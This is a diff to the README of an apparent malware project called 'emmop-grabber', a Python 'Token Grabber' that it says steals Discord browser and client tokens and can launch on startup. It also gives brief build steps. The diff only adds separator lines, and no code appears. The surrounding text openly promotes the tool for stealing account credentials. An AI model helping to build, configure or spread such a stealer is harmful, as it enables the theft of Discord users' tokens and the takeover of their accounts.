@@ -1,6 +1,8 @@
 # emmop-grabber
 simple python Token Grabber that work with the new token system !
  
+ ---------------------------------------------------------
+ 
 Features :
 
  - Grab discord Token ( Browser token and client token ) 🧩
@@ -13,6 +15,8 @@ Features :
  
  - Launch on startup ( optional ) ✨
 
+---------------------------------------------------------
+
  ❓❓❓HOW TO USE IT ??
  
 1 - Open "install_python.bat" ( only if you dont have Python installed on your Computer )
@@ -24,6 +28,7 @@ The built file will be in the "dist" folder !
 
 ❓❓❓
 
+---------------------------------------------------------
 
 ❗❗❗
 Exemple of the builder :
